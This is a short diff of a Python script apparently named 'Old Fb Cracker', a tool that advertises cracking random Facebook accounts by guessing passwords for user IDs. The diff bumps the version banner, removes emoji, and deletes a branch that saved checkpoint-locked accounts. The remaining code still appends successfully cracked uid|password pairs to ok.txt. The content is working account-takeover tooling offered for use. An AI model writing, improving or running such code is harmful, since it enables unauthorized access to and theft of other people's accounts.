@@ -96,9 +96,9 @@ $$\   $$ |$$ |  $$ |$$ |  $$ |$$ |  $$ |
 \033[1;90m══════════════════════════════════════════════════
     """)
 		print("%s [%s•%s] %sTOOL NAME : %sOld Fb Cracker"%(G,R,G,B,G))
-		print("%s [%s•%s] %sVERSION   : %s1.0"%(G,R,G,B,G))
+		print("%s [%s•%s] %sVERSION   : %s5.0"%(G,R,G,B,G))
 		print("")
-		print("\n    \033[0;92m            UID😈 CLONING😈 \033[0;97m ")
+		print("\n    \033[0;92m            UID CLONING \033[0;97m ")
 		print("%s [%s1%s]%s CRACK RANDOM FB ID 2004-16 {JUST NOW} %s(FREE)"%(G,R,G,Y,B))
 		tanya = input("    \033[0;91m(#)\033[0;92m CHOOSE : ")
 		if tanya in ["", " "]:
@@ -159,11 +159,7 @@ $$\   $$ |$$ |  $$ |$$ |  $$ |$$ |  $$ |
 				self.ok.append("%s|%s"%(uid, pw))
 				open("ok.txt","a").write("  * --> %s|%s\n"%(uid, pw))
 				break
-			elif "www.facebook.com" in response.json()["error_msg"]:
-				print("\r  \033[0;91m   [SARA-CP] %s | %s\033[0;97m         "%(uid, pw))
-				self.cp.append("%s|%s"%(uid, pw))
-				open("cp.txt","a").write("  * --> %s|%s\n"%(uid, pw))
-				break
+			
 			else:
 				continue
  
